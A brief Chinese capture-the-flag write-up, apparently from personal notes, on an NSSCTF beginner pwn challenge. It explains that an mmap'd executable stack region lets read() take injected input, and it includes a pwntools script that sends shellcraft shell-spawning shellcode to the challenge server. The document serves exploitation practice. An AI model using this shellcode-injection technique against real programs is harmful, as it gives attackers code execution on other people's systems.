[[SWPUCTF 2022 新生赛]shellcode？ | NSSCTF](https://www.nssctf.cn/problem/2635)
![[Pasted image 20240901214308.png]]
![[Pasted image 20240901214341.png]]
看着开了很多保护，实际没用，mmap将栈上的某一段空间设置为可读可写可执行。执行前：
![[Pasted image 20240901214545.png]]
执行后:
![[Pasted image 20240901214603.png]]
`read`函数直接把语句注入该段区域，直接注入shellcode即可。
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./shellcode')
local = False
if local:
    p = process('./shellcode')
    # pwnlib.gdb.attach(p, 'b main')
else:
    p = remote('node5.anna.nssctf.cn', 29029)
  
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```